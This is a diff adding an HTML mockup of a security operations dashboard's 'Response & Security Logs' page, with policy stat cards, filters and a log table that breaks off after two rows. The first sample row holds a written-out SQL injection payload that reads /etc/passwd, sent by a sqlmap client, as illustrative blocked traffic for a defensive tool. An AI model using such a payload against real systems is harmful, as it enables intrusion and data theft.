@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1.0" name="viewport"/><meta content="web_dashboard" name="shell-type"/><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500;700&amp;display=swap" rel="stylesheet"/><link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/><style>@layer base{html,body{margin:0;padding:0;}body{overscroll-behavior:none;}main>:first-child{margin-top:0!important;}main>:last-child{margin-bottom:0!important;}}::-webkit-scrollbar{display:none;}</style><script src="https://cdn.tailwindcss.com"></script><script id="tailwind-config">tailwind.config={darkMode:"class",theme:{extend:{"colors":{"error-container":"#93000a","surface-container":"#191f2f","on-secondary":"#002e6a","error":"#ffb4ab","surface-tint":"#4cd7f6","on-secondary-container":"#e6ecff","surface-variant":"#2f3445","tertiary-container":"#1bbd85","tertiary-fixed-dim":"#4edea3","secondary-fixed-dim":"#adc6ff","primary-container":"#06b6d4","on-tertiary-fixed":"#002113","on-error-container":"#ffdad6","on-primary-fixed-variant":"#004e5c","inverse-primary":"#00687a","on-secondary-fixed-variant":"#004395","on-tertiary-fixed-variant":"#005236","surface":"#0d1322","primary-fixed-dim":"#4cd7f6","surface-container-lowest":"#080e1d","outline-variant":"#3d494c","on-primary-fixed":"#001f26","on-surface-variant":"#bcc9cd","on-primary":"#003640","outline":"#869397","primary-fixed":"#acedff","on-primary-container":"#00424f","tertiary-fixed":"#6ffbbe","on-tertiary-container":"#00452e","primary":"#4cd7f6","surface-dim":"#0d1322","surface-bright":"#33394a","tertiary":"#4edea3","surface-container-low":"#151b2b","on-background":"#dde2f8","inverse-surface":"#dde2f8","surface-container-highest":"#2f3445","secondary-fixed":"#d8e2ff","secondary-container":"#0566d9","on-error":"#690005","surface-container-high":"#242a3a","on-secondary-fixed":"#001a42","inverse-on-surface":"#2a3040","on-surface":"#dde2f8","background":"#0d1322","on-tertiary":"#003824","secondary":"#adc6ff"},"borderRadius":{"DEFAULT":"0.125rem","lg":"0.25rem","xl":"0.5rem","full":"0.75rem"},"spacing":{"margin-desktop":"1.5rem","space-xs":"0.25rem","gutter-md":"1rem","margin-tablet":"1.25rem","space-2xs":"0.125rem","gutter":"0.75rem","space-md":"0.75rem","gutter-lg":"1.25rem","space-xl":"1.5rem","margin":"1rem","space-2xl":"2rem","space-sm":"0.5rem","space-lg":"1rem"},"fontFamily":{"body-default":["Inter"],"body-sm":["Inter"],"headline-md":["Inter"],"telemetry-data":["JetBrains Mono"],"display-lg":["Inter"],"telemetry-inline":["JetBrains Mono"],"badge-label":["JetBrains Mono"],"headline-sm":["Inter"],"display-lg-mobile":["Inter"],"body-strong":["Inter"]},"fontSize":{"body-default":["14px",{"lineHeight":"20px","fontWeight":"400"}],"body-sm":["12px",{"lineHeight":"16px","fontWeight":"400"}],"headline-md":["20px",{"lineHeight":"28px","letterSpacing":"-0.01em","fontWeight":"600"}],"telemetry-data":["13px",{"lineHeight":"18px","letterSpacing":"-0.01em","fontWeight":"500"}],"display-lg":["32px",{"lineHeight":"40px","letterSpacing":"-0.02em","fontWeight":"700"}],"telemetry-inline":["11px",{"lineHeight":"14px","fontWeight":"400"}],"badge-label":["10px",{"lineHeight":"12px","letterSpacing":"0.05em","fontWeight":"700"}],"headline-sm":["16px",{"lineHeight":"24px","fontWeight":"600"}],"display-lg-mobile":["24px",{"lineHeight":"32px","letterSpacing":"-0.01em","fontWeight":"700"}],"body-strong":["14px",{"lineHeight":"20px","fontWeight":"600"}]}}}}</script></head><body class="bg-surface font-body-default text-on-surface antialiased"><aside class="fixed left-0 top-0 h-full w-72 bg-surface-container-low z-50 flex flex-col justify-between shadow-[0_1px_8px_rgba(0,0,0,0.45)]"><div class="flex flex-col"><div class="h-16 px-space-xl flex items-center gap-space-sm bg-surface-container-lowest/60"><img alt="SentraWeb Shield Logo" class="h-8 w-auto object-contain" src="https://lh3.googleusercontent.com/aida/AEtjO1WzcdPRuMVHb_N3VcEqpOGiFm22GtxWqFa4Ivt0TWEW-dk0XJhz3foAxpTY94l2UbJZj4AJ5zyCxW6jZM93Y0abK5XNoVo7wdrl5SkHNaErQh1kXm98m28J8a_W9759x92bPha-T-tVqGfyi2_d704i0EzvpZLJgO_p5s0GJQhkh85oncZQ8Mf8BOORjqobYsMWfSZx75KQX7OLKpdXXrX3sKL-O464Sj-QOKMv0d5gV5VUEYeB83-ucl0"/><div class="flex flex-col"><span class="font-headline-sm text-headline-sm text-on-surface tracking-tight leading-none">SentraWeb</span><span class="font-badge-label text-badge-label text-primary uppercase mt-space-2xs">SOC v2.4 Enterprise</span></div></div><div class="px-space-md py-space-sm"><div class="px-space-sm py-space-xs font-badge-label text-badge-label uppercase text-on-surface-variant tracking-wider">Operational Modules</div><nav class="flex flex-col gap-space-2xs mt-space-xs" data-active-classes="bg-primary-container text-on-primary-container font-body-strong"><a class="flex items-center gap-space-sm px-space-md py-space-sm rounded-lg text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-colors font-body-default text-body-default" data-path="dashboard" href="#"><span class="material-symbols-outlined text-lg leading-none">speed</span><span>Dashboard</span></a><a class="flex items-center gap-space-sm px-space-md py-space-sm rounded-lg text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-colors font-body-default text-body-default" data-path="session-monitoring" href="#"><span class="material-symbols-outlined text-lg leading-none">radar</span><span>Session Monitoring</span></a><a class="flex items-center gap-space-sm px-space-md py-space-sm rounded-lg text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-colors font-body-default text-body-default" data-path="session-details" href="#"><span class="material-symbols-outlined text-lg leading-none">manage_search</span><span>Session Details</span></a><a class="flex items-center gap-space-sm px-space-md py-space-sm rounded-lg text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-colors font-body-default text-body-default" data-path="threat-detection" href="#"><span class="material-symbols-outlined text-lg leading-none">security</span><span>Threat Detection</span></a><a class="flex items-center gap-space-sm px-space-md py-space-sm rounded-lg text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-colors font-body-default text-body-default" data-path="risk-analysis" href="#"><span class="material-symbols-outlined text-lg leading-none">monitoring</span><span>Risk Analysis</span></a><a aria-current="page" class="flex items-center gap-space-sm px-space-md py-space-sm rounded-lg transition-colors bg-primary-container text-on-primary-container font-body-strong" data-path="response-and-logs" href="#"><span class="material-symbols-outlined text-lg leading-none">terminal</span><span>Response &amp; Logs</span></a><a class="flex items-center gap-space-sm px-space-md py-space-sm rounded-lg text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-colors font-body-default text-body-default" data-path="settings" href="#"><span class="material-symbols-outlined text-lg leading-none">settings</span><span>Settings</span></a></nav></div></div><div class="p-space-md m-space-md rounded-xl bg-surface-container-lowest/80 flex flex-col gap-space-xs"><div class="flex items-center justify-between"><span class="font-badge-label text-badge-label text-on-surface-variant uppercase">Engine Status</span><span class="flex items-center gap-space-xs font-telemetry-inline text-telemetry-inline text-tertiary"><span class="w-1.5 h-1.5 rounded-full bg-tertiary animate-pulse"></span>Active v2.1</span></div><div class="font-telemetry-inline text-telemetry-inline text-on-surface-variant">Context-Aware Inspection</div><div class="pt-space-xs flex items-center justify-between font-telemetry-inline text-telemetry-inline text-outline"><span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-tertiary"></span>SQLite + Flask API</span><span class="text-tertiary">SYNCED</span></div><div class="pt-space-xs flex items-center justify-between font-telemetry-inline text-telemetry-inline text-on-surface-variant"><span>RAM: 3.4 GB / 8 GB</span><span>LAT: 12ms</span></div></div></aside><div class="pl-72"><header class="fixed top-0 left-72 right-0 h-16 bg-surface/85 backdrop-blur-xl z-40 px-gutter-lg flex items-center justify-between shadow-[0_1px_8px_rgba(0,0,0,0.3)]"><div class="flex items-center gap-space-lg"><nav class="flex items-center gap-space-xs font-body-sm text-body-sm text-on-surface-variant"><span class="hover:text-on-surface cursor-pointer">SOC</span><span class="material-symbols-outlined text-sm">chevron_right</span><span class="text-on-surface font-body-strong text-body-strong">Command Center</span></nav><div class="relative flex items-center"><span class="material-symbols-outlined absolute left-3 text-outline text-base">search</span><input class="w-72 bg-surface-container-lowest text-on-surface placeholder:text-outline font-telemetry-data text-telemetry-data pl-9 pr-space-md py-1.5 rounded-lg outline-none focus:ring-1 focus:ring-primary" placeholder="Search IP, Session ID, CVE..." type="text"/></div></div><div class="flex items-center gap-space-md"><div class="hidden xl:flex items-center gap-space-xs px-space-md py-1 rounded-full bg-surface-container-high"><span class="w-2 h-2 rounded-full bg-tertiary animate-ping"></span><span class="w-2 h-2 rounded-full bg-tertiary -ml-3"></span><span class="font-badge-label text-badge-label text-tertiary tracking-wide uppercase">MONITORING ACTIVE: 142 req/s</span></div><div class="flex items-center gap-space-xs"><button class="flex items-center gap-1 px-space-sm py-1.5 rounded-lg bg-surface-container-high hover:bg-surface-bright text-on-surface font-body-sm text-body-sm transition-colors" type="button"><span class="material-symbols-outlined text-base">refresh</span><span class="hidden md:inline">Refresh</span></button><button class="flex items-center gap-1 px-space-sm py-1.5 rounded-lg bg-surface-container-high hover:bg-surface-bright text-on-surface font-body-sm text-body-sm transition-colors" type="button"><span class="material-symbols-outlined text-base">file_download</span><span class="hidden md:inline">Export</span></button></div><div class="relative"><button class="p-1.5 rounded-lg text-on-surface-variant hover:text-on-surface hover:bg-surface-container-high transition-colors flex items-center justify-center" type="button"><span class="material-symbols-outlined text-xl">notifications</span><span class="absolute top-1 right-1 w-4 h-4 rounded-full bg-error text-on-error font-badge-label text-badge-label flex items-center justify-center font-bold">3</span></button></div><div class="flex items-center gap-space-sm pl-space-sm"><img alt="Profile" class="w-8 h-8 rounded-full object-cover" src="https://lh3.googleusercontent.com/aida-public/AB6AXuDtWLgr7HPH_vbv4GJ3deQ_PCTWMj6bmUjUGf4rz48XEwuxBrIHLXqBsO5AJMInzD3ioxgDITSu8guBQrRz7w6yU5STFHPacWl7Tajdi1e67Oqt3E8ydnAx9clHyOVPV6TaSsF5wsQHYS5RGzuCaQPgPBPBYCChw5Si5krY7Pnq9MoXE5dVOGAihh3Fv9lXxhLZ8YXe2Vlzk09CICgTs-sKf2054xhRrl6UZkZs0-HjLGIDP3VL-IFL"/><div class="hidden lg:flex flex-col text-left"><div class="flex items-center gap-1.5"><span class="font-body-strong text-body-strong text-on-surface leading-none">Sarah Chen</span><span class="font-badge-label text-badge-label px-1 py-0.2 rounded bg-surface-container-highest text-primary">Lead</span></div><span class="font-telemetry-inline text-telemetry-inline text-on-surface-variant leading-none mt-1">Cluster-US-East</span></div></div></div></header><main class="w-full pt-16 px-gutter-lg py-gutter-lg bg-surface min-h-screen"><div class="flex flex-col w-full gap-space-lg">
+<!-- Breadcrumb, Operational Status & Subtitle -->
+<div class="flex flex-col md:flex-row md:items-end justify-between gap-space-md">
+<div class="flex flex-col gap-space-2xs">
+<div class="flex items-center gap-space-xs font-badge-label text-badge-label uppercase text-primary tracking-widest">
+<span>SOC Engine Core</span>
+<span class="text-outline">/</span>
+<span>Audit Trail &amp; Policy Enforcement</span>
+</div>
+<h1 class="font-headline-md text-headline-md text-on-surface tracking-tight flex items-center gap-space-sm">
+        Response &amp; Security Logs
+        <span class="font-telemetry-inline text-telemetry-inline px-space-xs py-0.5 rounded bg-surface-container-high text-primary font-normal">v2.4 Live Buffer</span>
+</h1>
+<p class="font-body-sm text-body-sm text-on-surface-variant max-w-2xl">
+        Forensic chronicle of automated heuristics, behavioral challenges, and analyst-triggered mitigation protocols across the distributed edge gateway.
+      </p>
+</div>
+<!-- Active Stream Telemetry & Quick Snapshot -->
+<div class="flex items-center gap-space-sm shrink-0">
+<div class="flex items-center gap-space-xs px-space-md py-1.5 rounded-lg bg-surface-container-low shadow-sm">
+<span class="w-2 h-2 rounded-full bg-tertiary animate-pulse"></span>
+<span class="font-telemetry-data text-telemetry-data text-on-surface">1,842,910</span>
+<span class="font-badge-label text-badge-label text-on-surface-variant uppercase">Captured Events</span>
+</div>
+<div class="flex items-center gap-space-xs px-space-md py-1.5 rounded-lg bg-surface-container-low shadow-sm">
+<span class="material-symbols-outlined text-base text-primary">chevron_forward</span>
+<span class="font-telemetry-inline text-telemetry-inline text-on-surface-variant">Sync: <span class="text-tertiary">Real-Time</span></span>
+</div>
+</div>
+</div>
+<!-- 1. Action Policy Summary Banner (4 Stat Cards with Sparklines / Visual Ratios) -->
+<div class="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-space-md">
+<!-- ALLOW Card -->
+<div class="relative overflow-hidden rounded-xl bg-surface-container-low p-space-md shadow-md flex flex-col justify-between group hover:bg-surface-container transition-all">
+<div class="absolute -right-4 -top-4 w-24 h-24 bg-tertiary/5 rounded-full blur-xl pointer-events-none"></div>
+<div class="flex items-center justify-between mb-space-sm">
+<div class="flex items-center gap-space-xs">
+<span class="w-2.5 h-2.5 rounded-full bg-tertiary"></span>
+<span class="font-badge-label text-badge-label uppercase text-tertiary tracking-wider font-bold">ALLOW POLICY</span>
+</div>
+<span class="font-telemetry-inline text-telemetry-inline text-tertiary bg-tertiary/10 px-1.5 py-0.5 rounded">99.2%</span>
+</div>
+<div>
+<div class="font-display-lg text-display-lg text-on-surface tracking-tight font-bold">1,828,400</div>
+<div class="font-body-sm text-body-sm text-on-surface-variant mt-0.5 flex items-center justify-between">
+<span>Unimpeded standard routing</span>
+<span class="font-telemetry-inline text-telemetry-inline text-tertiary">↑ 0.4%</span>
+</div>
+</div>
+<!-- Mini Sparkline inline SVG -->
+<div class="mt-space-md pt-space-xs flex items-end justify-between h-7 w-full gap-1">
+<span class="w-full bg-tertiary/20 rounded-t h-[65%] group-hover:bg-tertiary/40 transition-colors"></span>
+<span class="w-full bg-tertiary/20 rounded-t h-[75%] group-hover:bg-tertiary/40 transition-colors"></span>
+<span class="w-full bg-tertiary/20 rounded-t h-[70%] group-hover:bg-tertiary/40 transition-colors"></span>
+<span class="w-full bg-tertiary/20 rounded-t h-[85%] group-hover:bg-tertiary/40 transition-colors"></span>
+<span class="w-full bg-tertiary/30 rounded-t h-[92%] group-hover:bg-tertiary/50 transition-colors"></span>
+<span class="w-full bg-tertiary rounded-t h-[100%] shadow-sm"></span>
+</div>
+</div>
+<!-- VERIFY Card -->
+<div class="relative overflow-hidden rounded-xl bg-surface-container-low p-space-md shadow-md flex flex-col justify-between group hover:bg-surface-container transition-all">
+<div class="absolute -right-4 -top-4 w-24 h-24 bg-primary/5 rounded-full blur-xl pointer-events-none"></div>
+<div class="flex items-center justify-between mb-space-sm">
+<div class="flex items-center gap-space-xs">
+<span class="w-2.5 h-2.5 rounded-full bg-primary animate-pulse"></span>
+<span class="font-badge-label text-badge-label uppercase text-primary tracking-wider font-bold">VERIFY CHALLENGE</span>
+</div>
+<span class="font-telemetry-inline text-telemetry-inline text-primary bg-primary/10 px-1.5 py-0.5 rounded">0.45%</span>
+</div>
+<div>
+<div class="font-display-lg text-display-lg text-on-surface tracking-tight font-bold">8,410</div>
+<div class="font-body-sm text-body-sm text-on-surface-variant mt-0.5 flex items-center justify-between">
+<span>Step-up 2FA, WebAuthn &amp; PoW</span>
+<span class="font-telemetry-inline text-telemetry-inline text-on-surface-variant">87% solved</span>
+</div>
+</div>
+<div class="mt-space-md pt-space-xs flex items-end justify-between h-7 w-full gap-1">
+<span class="w-full bg-primary/20 rounded-t h-[40%] group-hover:bg-primary/40 transition-colors"></span>
+<span class="w-full bg-primary/20 rounded-t h-[60%] group-hover:bg-primary/40 transition-colors"></span>
+<span class="w-full bg-primary/20 rounded-t h-[55%] group-hover:bg-primary/40 transition-colors"></span>
+<span class="w-full bg-primary/30 rounded-t h-[70%] group-hover:bg-primary/50 transition-colors"></span>
+<span class="w-full bg-primary/25 rounded-t h-[65%] group-hover:bg-primary/45 transition-colors"></span>
+<span class="w-full bg-primary rounded-t h-[80%] shadow-sm"></span>
+</div>
+</div>
+<!-- RESTRICT Card -->
+<div class="relative overflow-hidden rounded-xl bg-surface-container-low p-space-md shadow-md flex flex-col justify-between group hover:bg-surface-container transition-all">
+<div class="absolute -right-4 -top-4 w-24 h-24 bg-secondary-fixed-dim/5 rounded-full blur-xl pointer-events-none"></div>
+<div class="flex items-center justify-between mb-space-sm">
+<div class="flex items-center gap-space-xs">
+<span class="w-2.5 h-2.5 rounded-full bg-secondary"></span>
+<span class="font-badge-label text-badge-label uppercase text-secondary tracking-wider font-bold">RESTRICT RATE</span>
+</div>
+<span class="font-telemetry-inline text-telemetry-inline text-secondary bg-secondary/10 px-1.5 py-0.5 rounded">0.22%</span>
+</div>
+<div>
+<div class="font-display-lg text-display-lg text-on-surface tracking-tight font-bold">4,120</div>
+<div class="font-body-sm text-body-sm text-on-surface-variant mt-0.5 flex items-center justify-between">
+<span>Throttled to 1 req/s &amp; scope clamp</span>
+<span class="font-telemetry-inline text-telemetry-inline text-secondary">↓ 1.2%</span>
+</div>
+</div>
+<div class="mt-space-md pt-space-xs flex items-end justify-between h-7 w-full gap-1">
+<span class="w-full bg-secondary/20 rounded-t h-[75%] group-hover:bg-secondary/40 transition-colors"></span>
+<span class="w-full bg-secondary/20 rounded-t h-[60%] group-hover:bg-secondary/40 transition-colors"></span>
+<span class="w-full bg-secondary/30 rounded-t h-[50%] group-hover:bg-secondary/50 transition-colors"></span>
+<span class="w-full bg-secondary/20 rounded-t h-[45%] group-hover:bg-secondary/40 transition-colors"></span>
+<span class="w-full bg-secondary/30 rounded-t h-[35%] group-hover:bg-secondary/50 transition-colors"></span>
+<span class="w-full bg-secondary rounded-t h-[40%] shadow-sm"></span>
+</div>
+</div>
+<!-- BLOCK Card -->
+<div class="relative overflow-hidden rounded-xl bg-surface-container-low p-space-md shadow-md flex flex-col justify-between group hover:bg-surface-container transition-all">
+<div class="absolute -right-4 -top-4 w-24 h-24 bg-error/10 rounded-full blur-xl pointer-events-none"></div>
+<div class="flex items-center justify-between mb-space-sm">
+<div class="flex items-center gap-space-xs">
+<span class="w-2.5 h-2.5 rounded-full bg-error animate-ping"></span>
+<span class="w-2.5 h-2.5 rounded-full bg-error -ml-3.5"></span>
+<span class="font-badge-label text-badge-label uppercase text-error tracking-wider font-bold">BLOCK ENFORCED</span>
+</div>
+<span class="font-telemetry-inline text-telemetry-inline text-error bg-error/15 px-1.5 py-0.5 rounded font-bold">0.11%</span>
+</div>
+<div>
+<div class="font-display-lg text-display-lg text-error tracking-tight font-bold">1,980</div>
+<div class="font-body-sm text-body-sm text-on-surface-variant mt-0.5 flex items-center justify-between">
+<span>Immediate TCP RST / 403 Hard Drop</span>
+<span class="font-telemetry-inline text-telemetry-inline text-error">↑ 18 today</span>
+</div>
+</div>
+<div class="mt-space-md pt-space-xs flex items-end justify-between h-7 w-full gap-1">
+<span class="w-full bg-error/20 rounded-t h-[30%] group-hover:bg-error/40 transition-colors"></span>
+<span class="w-full bg-error/30 rounded-t h-[45%] group-hover:bg-error/50 transition-colors"></span>
+<span class="w-full bg-error/20 rounded-t h-[25%] group-hover:bg-error/40 transition-colors"></span>
+<span class="w-full bg-error/40 rounded-t h-[65%] group-hover:bg-error/60 transition-colors"></span>
+<span class="w-full bg-error/30 rounded-t h-[50%] group-hover:bg-error/50 transition-colors"></span>
+<span class="w-full bg-error rounded-t h-[85%] shadow-sm"></span>
+</div>
+</div>
+</div>
+<!-- 2. Advanced Query & Filter Toolbar -->
+<div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-space-md bg-surface-container-low p-space-md rounded-xl shadow-md">
+<!-- Left search input & filters -->
+<div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-space-sm flex-1">
+<!-- Monospace Search bar -->
+<div class="relative flex-1 min-w-[260px]">
+<span class="material-symbols-outlined absolute left-3 top-2.5 text-outline text-lg pointer-events-none">filter_alt</span>
+<input class="w-full bg-surface-container-lowest text-on-surface placeholder:text-outline font-telemetry-data text-telemetry-data pl-9 pr-8 py-2 rounded-lg outline-none focus:bg-surface-container-high transition-colors" id="logSearchInput" oninput="filterLogs(this.value)" placeholder="Filter by Request ID, Session ID, IP, or Reason..." type="text"/>
+<button class="hidden absolute right-2.5 top-2.5 text-outline hover:text-on-surface" id="clearSearchBtn" onclick="clearSearch()">
+<span class="material-symbols-outlined text-base">close</span>
+</button>
+</div>
+<!-- Action Filter Pills -->
+<div class="flex items-center gap-1.5 overflow-x-auto pb-1 sm:pb-0 shrink-0" id="filterPillGroup">
+<button class="action-pill px-space-sm py-1.5 rounded-lg font-badge-label text-badge-label uppercase tracking-wide bg-primary text-on-primary font-bold shadow-sm transition-all" onclick="setFilter('ALL', this)">
+          All (1.84M)
+        </button>
+<button class="action-pill px-space-sm py-1.5 rounded-lg font-badge-label text-badge-label uppercase tracking-wide bg-surface-container-high text-tertiary hover:bg-surface-container-highest transition-all flex items-center gap-1" onclick="setFilter('ALLOW', this)">
+<span class="w-1.5 h-1.5 rounded-full bg-tertiary"></span>
+          ALLOW
+        </button>
+<button class="action-pill px-space-sm py-1.5 rounded-lg font-badge-label text-badge-label uppercase tracking-wide bg-surface-container-high text-primary hover:bg-surface-container-highest transition-all flex items-center gap-1" onclick="setFilter('VERIFY', this)">
+<span class="w-1.5 h-1.5 rounded-full bg-primary"></span>
+          VERIFY
+        </button>
+<button class="action-pill px-space-sm py-1.5 rounded-lg font-badge-label text-badge-label uppercase tracking-wide bg-surface-container-high text-secondary hover:bg-surface-container-highest transition-all flex items-center gap-1" onclick="setFilter('RESTRICT', this)">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary"></span>
+          RESTRICT
+        </button>
+<button class="action-pill px-space-sm py-1.5 rounded-lg font-badge-label text-badge-label uppercase tracking-wide bg-surface-container-high text-error hover:bg-surface-container-highest transition-all flex items-center gap-1" onclick="setFilter('BLOCK', this)">
+<span class="w-1.5 h-1.5 rounded-full bg-error"></span>
+          BLOCK
+        </button>
+</div>
+</div>
+<!-- Right Export Controls -->
+<div class="flex items-center gap-space-xs shrink-0 self-end lg:self-center">
+<button class="flex items-center gap-1 px-space-md py-1.5 rounded-lg bg-surface-container-high hover:bg-surface-bright text-on-surface font-body-sm text-body-sm transition-colors shadow-sm" onclick="triggerExport('CSV')" title="Export selected view to RFC-4180 CSV format">
+<span class="material-symbols-outlined text-base">table_view</span>
+<span>Export CSV</span>
+</button>
+<button class="flex items-center gap-1 px-space-md py-1.5 rounded-lg bg-surface-container-high hover:bg-surface-bright text-on-surface font-body-sm text-body-sm transition-colors shadow-sm" onclick="triggerExport('JSON')" title="SQLite + Flask compatible JSON Payload">
+<span class="material-symbols-outlined text-base">data_object</span>
+<span class="hidden sm:inline">JSON (Flask)</span>
+</button>
+<button class="flex items-center gap-1 px-space-md py-1.5 rounded-lg bg-primary text-on-primary hover:bg-primary-fixed transition-colors font-body-strong text-body-strong shadow-sm" onclick="window.print()" title="Generate formatted SOC forensic summary">
+<span class="material-symbols-outlined text-base">print</span>
+<span class="hidden sm:inline">Print SOC Report</span>
+</button>
+</div>
+</div>
+<!-- 3. Comprehensive Security Event Log Table & Drawer Layout -->
+<div class="relative flex flex-col xl:flex-row gap-space-md items-start">
+<!-- Table Container -->
+<div class="w-full flex-1 rounded-xl bg-surface-container-low shadow-md overflow-hidden flex flex-col">
+<!-- Table Header & Auto-scroll Switch -->
+<div class="px-space-md py-2.5 bg-surface-container-lowest/80 flex items-center justify-between text-on-surface-variant font-badge-label text-badge-label uppercase">
+<div class="flex items-center gap-space-sm">
+<span>Ingest Pipe: eth0.sec / enp4s0</span>
+<span class="text-outline">•</span>
+<span class="text-tertiary flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-tertiary animate-pulse"></span> STREAMING BUFFER</span>
+</div>
+<div class="flex items-center gap-space-md">
+<label class="flex items-center gap-1.5 cursor-pointer select-none">
+<input checked="" class="accent-primary rounded" id="autoScrollToggle" type="checkbox"/>
+<span class="text-on-surface normal-case font-telemetry-inline text-telemetry-inline">Live Autotrail</span>
+</label>
+<span class="px-2 py-0.5 rounded bg-surface-container-high text-on-surface" id="activeCountBadge">15 in view</span>
+</div>
+</div>
+<!-- High-Density Scrollable Table Canvas -->
+<div class="overflow-x-auto w-full">
+<table class="w-full text-left text-on-surface border-collapse" id="secLogTable">
+<thead>
+<tr class="bg-surface-container-high/60 text-on-surface-variant font-badge-label text-badge-label uppercase tracking-wider h-10 select-none">
+<th class="px-3 py-2">Timestamp (UTC)</th>
+<th class="px-3 py-2">Request ID</th>
+<th class="px-3 py-2">Session ID</th>
+<th class="px-3 py-2">Client IP &amp; ASN</th>
+<th class="px-3 py-2">Endpoint</th>
+<th class="px-3 py-2 text-center">Risk</th>
+<th class="px-3 py-2">Policy Action</th>
+<th class="px-3 py-2 min-w-[200px]">Trigger Reason</th>
+<th class="px-3 py-2 text-right pr-4">Inspector</th>
+</tr>
+</thead>
+<tbody class="divide-y-0 text-body-sm font-body-default" id="logTableBody">
+<!-- ROW 1: Critical BLOCK SQLi -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="BLOCK" data-req="req_a78c01f4" data-risk="94">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:12.402</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_a78c01f4')">req_a78c01f4</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_9f82c1a4
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">194.26.29.112</span>
+<span class="text-outline text-[10px] ml-1">AS48282 (RU)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-error-container text-on-error-container font-bold text-[10px] mr-1">POST</span>
+<span class="text-on-surface">/api/v1/auth/login</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-error/20 text-error">94</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-error/20 text-error font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-error"></span> BLOCK
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="SQL Injection signature in POST body (UNION SELECT 1, null, @@version)">
+                SQL Injection signature in POST body
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_a78c01f4', '194.26.29.112', 'POST /api/v1/auth/login', 'SQL Injection signature in POST body (UNION SELECT detected)', 'BLOCK', '94', 'Headers: Host: api.sentraweb.io\nUser-Agent: sqlmap/1.7#dev\nContent-Type: application/json\nX-Forwarded-For: 194.26.29.112\n\nPayload:\n{\x22username\x22:\x22admin\x27 UNION SELECT 1,load_file(\x27/etc/passwd\x27)--\x22, \x22token\x22: \x22x99\x22}')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 2: VERIFY WebAuthn challenge -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface-container-high/20 group" data-action="VERIFY" data-req="req_e29b1090" data-risk="68">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:11.890</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_e29b1090')">req_e29b1090</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_34b9d02a
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">82.165.197.1</span>
+<span class="text-outline text-[10px] ml-1">AS8560 (DE)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-on-surface-variant font-bold text-[10px] mr-1">PUT</span>
+<span class="text-on-surface">/api/v2/users/credentials</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-primary/20 text-primary">68</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-primary/20 text-primary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-primary"></span> VERIFY
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Device Fingerprint Drift + Unrecognized Geolocation">
+                Device Fingerprint Drift + Unrecognized Geo
+              </td>
